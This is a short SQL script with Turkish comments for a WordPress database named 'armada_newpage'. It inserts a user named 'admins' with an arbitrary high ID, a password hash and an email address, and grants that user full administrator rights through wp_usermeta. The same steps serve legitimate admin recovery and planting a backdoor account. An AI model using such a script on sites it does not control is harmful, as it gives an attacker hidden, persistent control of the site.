-- Database: armada_newpage
-- User: armada_newpageusr

-- wp_users tablosuna kullanıcı ekleme
INSERT INTO wp_users (
    ID, 
    user_login, 
    user_pass, 
    user_nicename, 
    user_email, 
    user_registered, 
    user_status, 
    display_name
) VALUES (
    315231,
    'admins',
    '$2y$08$OuuAtwTqlWiJu.IoGfTL.OTU1QqpsBeOr61R.A.HfbUpBeLp6JOPq',
    'admins',
    'okanbilgi35@gmail.com',
    NOW(),
    0,
    'admins'
);

-- Kullanıcıya Yönetici (Administrator) yetkisi verme
INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
VALUES (315231, 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}')
ON DUPLICATE KEY UPDATE meta_value = 'a:1:{s:13:"administrator";b:1;}';

-- Kullanıcı seviyesini 10 (Admin) olarak ayarlama
INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
VALUES (315231, 'wp_user_level', '10')
ON DUPLICATE KEY UPDATE meta_value = '10';